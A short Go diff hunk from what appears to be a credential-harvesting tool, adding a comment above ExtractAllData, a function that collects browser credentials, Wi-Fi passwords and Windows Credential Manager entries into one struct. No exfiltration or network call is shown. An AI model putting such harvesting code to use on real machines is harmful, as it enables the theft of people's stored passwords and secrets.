@@ -48,6 +48,8 @@ type AllDataStruct struct {
 	CredmanData []common.UrlNamePass `json:"credman"`
 }
 
+
+//Function to extract all credentials from browsers, wifi passwords, and passwords from windows credential manager
 func ExtractAllData() (AllDataStruct, int) {
 	var wifiData, lengthWiFiData = ExtractWifiData()
 	var browserData, lengthBrowserData = ExtractBrowserCredentials()
